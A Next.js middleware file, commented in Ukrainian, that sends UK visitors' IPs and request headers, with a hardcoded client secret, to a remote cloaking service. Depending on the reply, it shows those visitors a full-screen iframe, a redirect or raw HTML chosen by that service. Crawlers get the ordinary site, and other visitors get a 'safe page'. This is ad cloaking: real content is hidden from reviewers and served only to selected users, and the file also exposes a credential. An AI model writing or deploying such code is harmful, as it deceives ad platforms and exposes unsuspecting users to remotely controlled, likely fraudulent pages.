import { NextRequest, NextResponse } from 'next/server'

const PALLADIUM_URL = 'https://rbl.palladium.expert'

const HTML_HEADERS = {
    'Content-Type': 'text/html',
    'X-Robots-Tag': 'noindex',
}

function isBot(ua: string) {
    return /bot|crawl|spider|slurp|bing|yandex|baidu/i.test(ua)
}

function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
    return Object.entries(obj).reduce((acc, [key, val]) => {
        const newKey = prefix ? `${prefix}[${key}]` : key
        if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
            Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey))
        } else {
            acc[newKey] = String(val)
        }
        return acc
    }, {} as Record<string, string>)
}

function collectServerHeaders(req: NextRequest, ip: string): Record<string, string> {
    const host = req.headers.get('host') || ''
    const url = req.nextUrl

    const headers: Record<string, string> = {
        REMOTE_ADDR: ip,
        SERVER_PORT: '443',
        QUERY_STRING: url.search.replace(/^\?/, ''),
        REQUEST_SCHEME: 'https',
        REQUEST_URI: url.pathname + url.search,
        REQUEST_TIME_FLOAT: String(Date.now() / 1000),
        Host: host,
        HTTP_HOST: host,
        HTTP_USER_AGENT: req.headers.get('user-agent') || '',
        HTTP_ACCEPT: req.headers.get('accept') || '',
        HTTP_ACCEPT_LANGUAGE: req.headers.get('accept-language') || '',
        HTTP_ACCEPT_ENCODING: req.headers.get('accept-encoding') || '',
        HTTP_REFERER: req.headers.get('referer') || '',
        HTTP_CONNECTION: req.headers.get('connection') || '',
        X_FORWARDED_FOR: req.headers.get('x-forwarded-for') || '',
        X_PURPOSE: req.headers.get('x-purpose') || '',
        X_FB_HTTP_ENGINE: req.headers.get('x-fb-http-engine') || '',
        X_WAP_PROFILE: req.headers.get('x-wap-profile') || '',
        bannerSource: 'adwords',
    }

    return headers
}

async function callPalladium(req: NextRequest, ip: string): Promise<NextResponse | null> {
    const payload = flattenPayload({
        request: {},
        jsrequest: {},
        server: collectServerHeaders(req, ip),
        auth: {
            clientId: 3024,
            clientCompany: 'GB9flyqir1ktVxpiYjYV',
            clientSecret:
                'MzAyNEdCOWZseXFpcjFrdFZ4cGlZallWY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    })

    try {
        const res = await fetch(PALLADIUM_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(payload),
            signal: AbortSignal.timeout(4000),
        })

        const reply = await res.json()
        const isTarget = Boolean(reply?.result)
        let mode = reply?.mode
        const target = reply?.target || ''
        const content = reply?.content || ''

        if (isTarget && mode && (target || content)) {
            if (/^https?:/i.test(target) && mode === 3) {
                mode = 2
            }

            // mode 1 — iframe
            if (mode === 1 && target) {
                const safeTarget = target.replace(/"/g, '&quot;')
                const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${safeTarget}" style="width:100%;height:100vh;border:none;position:absolute;top:0;left:0;z-index:999999;"></iframe></body></html>`
                return new NextResponse(html, { status: 200, headers: HTML_HEADERS })
            }

            // mode 2 — redirect
            if (mode === 2 && target) {
                return NextResponse.redirect(target, 302)
            }

            // mode 4 — raw content
            if (mode === 4 && content) {
                return new NextResponse(content, { status: 200, headers: HTML_HEADERS })
            }
        }

        // Palladium відповів, але не цільовий — показуємо safe page
        return null
    } catch (error) {
        console.error('[PALLADIUM] Error:', error)
        return null
    }
}

export async function middleware(req: NextRequest) {
    const { pathname } = req.nextUrl

    // 1) Пропускаємо статику, API, файли
    if (
        pathname.startsWith('/_next') ||
        pathname.startsWith('/api') ||
        /\.[a-zA-Z0-9]+$/.test(pathname)
    ) {
        return NextResponse.next()
    }

    // 2) Боти — без змін
    const ua = req.headers.get('user-agent') || ''
    if (isBot(ua)) {
        return NextResponse.next()
    }

    // 3) Дістаємо IP клієнта
    const ip =
        req.headers.get('x-real-ip') ||
        req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
        ''

    // 4) Визначаємо чи користувач з Великої Британії
    let isGB = false

    const geoCountry = req.headers.get('x-vercel-ip-country')
    if (geoCountry) {
        isGB = geoCountry === 'GB'
    } else if (ip) {
        try {
            const { success, country_code } = await fetch(`https://ipwho.is/${ip}`)
                .then(r => r.json())
            isGB = success && country_code === 'GB'
        } catch (e) {
            console.error('[GEO ERROR]', e)
        }
    }

    // 5) Якщо хто заходить на /site:
    if (pathname === '/site') {
        return isGB
            ? NextResponse.next()
            : NextResponse.redirect(new URL('/', req.url))
    }

    // 6) Якщо IP з Великої Британії — спочатку викликаємо Palladium
    if (isGB) {
        const palladiumResponse = await callPalladium(req, ip)

        // Якщо Palladium повернув цільову відповідь — віддаємо її
        if (palladiumResponse) {
            return palladiumResponse
        }

        // Якщо не цільовий або помилка — показуємо safe page
        const url = req.nextUrl.clone()
        url.pathname = '/site'
        return NextResponse.rewrite(url)
    }

    // 7) Решта — звичайний рендер
    return NextResponse.next()
}

export const config = {
    matcher: ['/', '/((?!_next|api).*)'],
}